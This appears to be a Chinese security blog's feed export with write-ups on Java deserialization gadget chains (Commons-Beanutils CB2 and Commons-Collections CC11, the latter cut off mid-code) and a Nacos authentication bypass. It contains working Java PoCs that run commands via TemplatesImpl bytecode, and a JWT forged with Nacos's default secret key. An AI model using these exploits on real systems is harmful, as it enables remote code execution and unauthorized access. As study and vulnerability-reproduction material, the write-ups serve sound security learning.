src="/posts/638f8ee9/c1-32.png" title="compare"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>得到的POC,<code>BeanComparator</code>构造参数的AttrCompare类换为其他实现<code>comparator</code>和序列化的无依赖组件均可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cb2Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool2</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons2</span> <span class="operator">=</span> ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.getDeclaredConstructor().newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">AttrCompare</span>());</span><br><span class="line">        setFieldValue(beanComparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="comment">//设置优先级队列对象</span></span><br><span class="line">        PriorityQueue pq=<span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置size大小，满足大于2的条件</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;size&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment">//设置比较器</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;comparator&quot;</span>,beanComparator);</span><br><span class="line">        <span class="comment">//设置传递的队列元素，需要将templates对象传入</span></span><br><span class="line">        Object[] list=<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="comment">//向PriorityQueue队列添加元素</span></span><br><span class="line">        setFieldValue(pq,<span class="string">&quot;queue&quot;</span>,list);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cb1payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cb1payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>总体来说就是CC2（templates+链转换器+PriorityQueue）利用将入口点改变为调用BeanComparator类，在BeanComparator类进行compare比较时，会调用getter&#x2F;setter javabean去获取比较对象的方法，若存在get&#x2F;set对应的方法，则通过反射执行该类的该方法，其中CB1链会依赖CC组件环境，CB2将BeanComparator类调用进行了赋值comparator比较器，规避了调用CC组件的comparator比较器，因此实现了无依赖cc环境，可主要用于shiro环境的漏洞攻击</p><h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p>java漫谈<br><a href="https://blog.csdn.net/qq_45449318/article/details/128571962">https://blog.csdn.net/qq_45449318/article/details/128571962</a><br><a href="https://mp.weixin.qq.com/s/3zvJucvcStoJMgvawkp55w">https://mp.weixin.qq.com/s/3zvJucvcStoJMgvawkp55w</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nacos身份认证绕过漏洞(QVD-2023-6271)复现与分析</title>
      <link href="/posts/ad3be142.html"/>
      <url>/posts/ad3be142.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>Nacos身份认证绕过漏洞(QVD-2023-6271)复现与分析</p><h1 id="0x01、Nacos描述"><a href="#0x01、Nacos描述" class="headerlink" title="0x01、Nacos描述"></a>0x01、Nacos描述</h1><p>Nacos是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。</p><p>官网：<a href="https://nacos.io/">https://nacos.io/</a><br>github项目：<a href="https://github.com/alibaba/nacos">https://github.com/alibaba/nacos</a></p><h1 id="0x02、漏洞描述"><a href="#0x02、漏洞描述" class="headerlink" title="0x02、漏洞描述"></a>0x02、漏洞描述</h1><p>开源服务管理平台 Nacos 中存在身份认证绕过漏洞，在默认配置下未对 token.secret.key 进行修改，导致远程攻击者可以绕过密钥认证进入后台，造成系统受控等后果。</p><h1 id="0x03、漏洞范围"><a href="#0x03、漏洞范围" class="headerlink" title="0x03、漏洞范围"></a>0x03、漏洞范围</h1><p>0.1.0 &lt;&#x3D; Nacos &lt;&#x3D; 2.2.0</p><h1 id="0x04、复现"><a href="#0x04、复现" class="headerlink" title="0x04、复现"></a>0x04、复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>下载漏洞版本：（0.1.0 &lt;&#x3D; Nacos &lt;&#x3D; 2.2.0均可）<br><a href="https://github.com/alibaba/nacos/releases/tag/2.2.0.1">https://github.com/alibaba/nacos/releases/tag/2.2.0.1</a></p><p>bin目录下启动<code>startup.cmd -m standalone</code>即可</p><p><img src="/posts/ad3be142/n1.png" title="启动环境"><br><img src="/posts/ad3be142/n2.png" title="启动环境"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>默认NACOS_AUTH_TOKEN:SecretKey012345678901234567890123456789012345678901234567890123456789</p><p>使用默认key进行jwt认证构造</p><p><img src="/posts/ad3be142/n3.png" title="key"></p><p>构造的jwt数据进行认证即可获取cookie</p><p><img src="/posts/ad3be142/n4.png" title="jwt伪造"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">header:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;nacos&quot;</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1678881619</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key:</span><br><span class="line">SecretKey012345678901234567890123456789012345678901234567890123456789</span><br></pre></td></tr></table></figure><h1 id="0x05、分析"><a href="#0x05、分析" class="headerlink" title="0x05、分析"></a>0x05、分析</h1><p>本质上还是secretkey密钥硬编码导致可以构造jwt身份数据，核心还是在jwt的鉴权上面。<br>0.1.0 &lt;&#x3D; Nacos &lt;&#x3D; 2.2.0版本中<br>使用鉴权插件默认token.secret.key：可参考<a href="https://nacos.io/zh-cn/docs/v2/guide/user/auth.html">官方文档</a></p><p><img src="/posts/ad3be142/n5.png" title="默认key"></p><p>nacos使用的jwt认证由三部分构成：<br>1、header：声明加密格式</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;HS256&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、PAYLOAD data数据：身份数据，由sub对象（用户角色）+exp（时间戳）构成<br>确保时间戳在当前时间范围内即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;nacos&quot;</span>,</span><br><span class="line">  <span class="string">&quot;exp&quot;</span>: <span class="number">1678881619</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、签名：由header加密格式加密secretkey形成的签名，用于验证数据是否正确</p><p><img src="/posts/ad3be142/n6.png" title="secretkey"></p><p>至于选择secret base64 encoded选项</p><p>在源码中，位置plugin-default-impl\src\main\java\com\alibaba\nacos\plugin\auth\impl\JwtTokenManager.java中，针对secret会先从配置文件中获取key值</p><p><img src="/posts/ad3be142/n9.png" title="获取Key"></p><p>然后将获取的key值进行base64_decode()解码，因此默认key（SecretKey012345678901234567890123456789012345678901234567890123456789）实际上在程序处理中是作为已经被base64编码过后的值，再将base64解码过后的secret值使用hs256签名</p><p><img src="/posts/ad3be142/n8.png" title="base64_decode"></p><p>当sub对象为nacos，并且签名正确，即可通过nacos鉴权认证，因此由上面部分，使用默认key生成的jwt即可绕过nacos的鉴权</p><p><img src="/posts/ad3be142/n4.png" title="jwt伪造"></p><h1 id="0x06、修复"><a href="#0x06、修复" class="headerlink" title="0x06、修复"></a>0x06、修复</h1><p>1、官方更新补丁：<a href="https://github.com/alibaba/nacos/releases/tag/2.2.0.1">https://github.com/alibaba/nacos/releases/tag/2.2.0.1</a><br>修复方式：移除了默认key，部署新版本时必须要输入自定义的有效token.secret.key</p><p><img src="/posts/ad3be142/n7.png" title="修复"></p><p>2、缓解办法：application.properties文件中token.secret.key默认值进行更改。</p><h1 id="0x07、参考链接"><a href="#0x07、参考链接" class="headerlink" title="0x07、参考链接"></a>0x07、参考链接</h1><p><a href="https://nacos.io/zh-cn/docs/v2/guide/user/auth.html">https://nacos.io/zh-cn/docs/v2/guide/user/auth.html</a><br><a href="https://github.com/alibaba/nacos/issues/10060">https://github.com/alibaba/nacos/issues/10060</a><br><a href="https://avd.aliyun.com/detail?id=AVD-2023-1655789">https://avd.aliyun.com/detail?id=AVD-2023-1655789</a><br><a href="https://nox.qianxin.com/article/541">https://nox.qianxin.com/article/541</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC11链学习与分析</title>
      <link href="/posts/7e9687c7.html"/>
      <url>/posts/7e9687c7.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>CC1-7分析完，接着cc11使用比较广泛（优势：使用到字节码加载且cc组件版本在3.1-3.2.1），接着分析下CC11（CC2+CC6的组合变式）。该链我认为跟CCK1链区别不是很大，暂且算在同一个利用链链上面。</p><h1 id="0x01、分析"><a href="#0x01、分析" class="headerlink" title="0x01、分析"></a>0x01、分析</h1><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><p>CC2（TemplatesImpl）：</p><ul><li>通过反射调用<code>InvokerTransformer</code>构造方法传递方法名<code>getOutputProperties/newTransformer</code>。</li><li>通过<code>javassist</code>生成恶意代码的字节码。</li><li>通过<code>TemplatesImpl</code>将字节码转化成类。</li><li>将反射<code>InvokerTransformer</code>对象作为比较器传递入<code>PriorityQueue</code>优先级队列。</li><li>将<code>TemplatesImpl</code>对象元素添加入<code>PriorityQueue</code>队列。</li><li>在比较器进行元素比较时触发<code>TemplatesImpl</code>的<code>getOutputProperties/newTransformer</code>方法，触发漏洞。</li></ul><hr><p>CC6：</p><ul><li>生成<code>LazyMap</code>对象，将<code>InvokerTransformer</code>利用方法串起来的<code>ChainedTransformer</code>对象传入<code>LazyMap</code>构造方法。</li><li>将<code>LazyMap</code>对象传入<code>TiedMapEntry</code>类构造方法，再通过<code>TiedMapEntry.hashCode()</code>方法去调用<code>TiedMapEntry.getValue()</code>方法，最后调用到<code>lazyMap.get()</code>方法。</li><li>通过使用<code>hashmap</code>的<code>put</code>方法添加元素时调用<code>hash(key)</code>方法，进而调用<code>key.hashCode()</code>方法，将<code>TiedMapEntry</code>对象作为key<code>put</code>入<code>hashmap</code>中，达到调用<code>TiedMapEntry.hashCode()</code>的目的（hashSet同理,本质上都是调用hashmap）。</li></ul><p>cc2和cc6的分析：（就不把相同部分贴进来了分析思路即可）<br><a href="https://okaytc.github.io/posts/7e30cd4a.html">cc2</a><br><a href="https://okaytc.github.io/posts/9758c0a8.html">cc6</a></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>cc11使用cc2的字节码再加上cc6的hashset(hashmap同理)进行组合变式，通过hashset的添加值去触发字节码加载达到漏洞效果。</p><p><code>TemplatesImpl</code>字节码加载部分见cc2分析中写的即可，主要目的是调用<code>newTransformer/getOutputProperties</code>方法来对字节码加载进行实例化，从而触发漏洞。</p><h3 id="cc6利用原理"><a href="#cc6利用原理" class="headerlink" title="cc6利用原理"></a>cc6利用原理</h3><p>接着先理一下cc6中后半段得利用</p><p><code>Lazymap</code>调用<code>decorate</code>方法对<code>Lazymap</code>进行实例化对象，同时传递参数<code>Transformer factory</code></p><p><img src="/posts/7e9687c7/cc11-1.png" title="lazymap"></p><p>调用构造方法对factory变量进行赋值</p><p><img src="/posts/7e9687c7/cc11-2.png" title="factory赋值"></p><p>然后通过调用<code>lazymap</code>的<code>get</code>方法调用<code>factory.transform(key)</code>方法</p><p><img src="/posts/7e9687c7/cc11-3.png" title="get"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>然后将上面的<code>transformerChain</code>变量传递实例化<code>Lazymap</code>的<code>factory</code>，达到调用<code>transformers.transform()</code>，触发漏洞。</p><p>然后就是找到在哪调用的<code>LazyMap.get</code>方法，cc6中就是通过<code>TiedMapEntry.getValue()</code>去调用<code>get</code>方法</p><p><img src="/posts/7e9687c7/cc11-4.png" title="TiedMapEntry"></p><p>接着上一步<code>hashCode</code>方法调用<code>getValue()</code></p><p><img src="/posts/7e9687c7/cc11-5.png" title="hashCode"></p><p>然后通过<code>hashset</code>调用<code>hashCode</code>，调用情况如下，将<code>TiedMapEntry</code>作为<code>key</code>，调用<code>hashset.add(key)</code>即可调用<code>key.hashCode()</code>即<code>TiedMapEntry.hashCode()</code>触发漏洞</p><p><img src="/posts/7e9687c7/cc11-6.png" title="hashCode"><br><img src="/posts/7e9687c7/cc11-7.png" title="put"><br><img src="/posts/7e9687c7/cc11-8.png" title="hashcode"></p><h3 id="cc11分析"><a href="#cc11分析" class="headerlink" title="cc11分析"></a>cc11分析</h3><p>漏洞原理知道了，现在就看cc11中<code>hashset</code>如何调用到<code>TemplatesImpl</code>字节码的<code>newTransformer/getOutputProperties</code>方法</p><p>主要变动在链转换器的调用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line"><span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line"><span class="comment">//突破限制，强制调用</span></span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br></pre></td></tr></table></figure><p>cc11通过反射调用<code>invokerTransformer</code>对象构造参数，并将<code>newTransformer</code>方法名传入</p><p><img src="/posts/7e9687c7/cc11-9.png" title="invokerTransformer"></p><p>然后调用LazyMap调用<code>decorate</code>方法对<code>Lazymap</code>进行实例化对象，同时传递参数<code>Transformer factory</code>（参数即为<code>invokerTransformer</code>对象），目的调用<code>invokerTransformer.transform()</code></p><p><img src="/posts/7e9687c7/cc11-10.png" title="get"></p><p>只需要传递的key为<code>TemplatesImpl</code>对象，就能调用<code>invokerTransformer.transform(TemplatesImpl)</code>，即反射调用<code>TemplatesImpl.newTransformer</code>方法，触发漏洞。</p><p>通过<code>TiedMapEntry</code>调用get方法，其中key参数即为<code>TemplatesImpl</code>对象目的调用<code>get(TemplatesImpl)</code>，其中的<code>map</code>参数即为<code>Lazymap</code>对象，目的调用<code>Lazymap.get()</code>方法</p><p><img src="/posts/7e9687c7/cc11-11.png" title="get"></p><p>因此构造的代码为,后面通过<code>hashset.add</code>进行触发，为了规避本地触发问题，通过反射修改<code>hashset</code>表的<code>key</code>值在cc6中分析提及过。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">    <span class="comment">//突破限制，强制调用</span></span><br><span class="line">    cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="comment">//生成InvokerTransformer对象,引用构造函数，参数为getOutputProperties方法名，也可以为newTransformer方法名</span></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> (InvokerTransformer) cons.newInstance(<span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//效果同上，方式不同，一种通过反射调用单参数的构造方法，另一种通过反射修改参数值，因为InvokerTransformer类的单参数构造方法无法直接实例化</span></span><br><span class="line">    <span class="comment">//InvokerTransformer transformer = new InvokerTransformer(&quot;any&quot;, new Class[0], new Object[0]);</span></span><br><span class="line">    <span class="comment">//反射修改iMethodName值为调用TemplatesImpl的newTransformer来执行恶意字节码</span></span><br><span class="line">    <span class="comment">//setFieldValue(transformer,&quot;iMethodName&quot;,&quot;newTransformer&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">    <span class="comment">//创建LazyMap对象调用decorate回调方法</span></span><br><span class="line">    Map Lmap= LazyMap.decorate(map,invokerTransformer);</span><br><span class="line">    TiedMapEntry TM=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lmap,templates);</span><br><span class="line">    HashSet hs=<span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">    hs.add(<span class="string">&quot;any&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取hashset中的hashmap对象属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">hsset</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    hsset.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    HashMap hsmap=(HashMap) hsset.get(hs);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过反射获取HashMap表中的table字段属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Object[] tablearray = (Object[])table.get(hsmap);</span><br><span class="line">    <span class="comment">//对node进行初始化</span></span><br><span class="line">    <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> tablearray[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//获取table表中目标元素，也就是要修改的元素,由于序号不同（比如我这是13），写了个直接遍历序号不为null的表示存在Key</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;tablearray.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(tablearray[i]==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        node = tablearray[i];</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//修改元素的key值为TiedMapEntry</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    key.set(node,TM);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(obj, value);</span><br></pre></td></tr></table></figure><p>将<code>TemplatesImpl</code>字节码部分和反序列化部分加上就得到完整的poc：</p><h3 id="cc11-poc-hashset"><a href="#cc11-poc-hashset" class="headerlink" title="cc11-poc(hashset)"></a>cc11-poc(hashset)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//创建CtClass对象容器</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool2</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//pool2.insertClassPath(new ClassClassPath(AbstractTranslet.class));</span></span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ct</span> <span class="operator">=</span> pool2.makeClass(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">        <span class="comment">//设置People2类的父类为AbstractTranslet，满足实例化条件</span></span><br><span class="line">        ct.setSuperclass(pool2.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons2</span> <span class="operator">=</span> ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons2.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        <span class="comment">//javassist转换字节码并转化为二位数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytecode = ct.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] bytecodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecode&#125;;</span><br><span class="line">        <span class="comment">//实例化TemplatesImpl对象</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredConstructor().newInstance();</span><br><span class="line">        <span class="comment">//设置满足条件属性_bytecodes为恶意构造字节码</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytecodes);</span><br><span class="line">        <span class="comment">//设置满足条件属性_class为空</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_name不为空，任意赋值都行</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="comment">//设置满足条件属性_tfactory实例化</span></span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, TransformerFactoryImpl.class.getDeclaredConstructor().newInstance());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射调用InvokerTransformer的带参构造方法，参数为执行的方法名，因此传递类型为String.class</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>).getDeclaredConstructor(String.class);</span><br><span class="line">        <span class="comment">//突破限制，强制调用</span></span><br><span class="line">        cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span 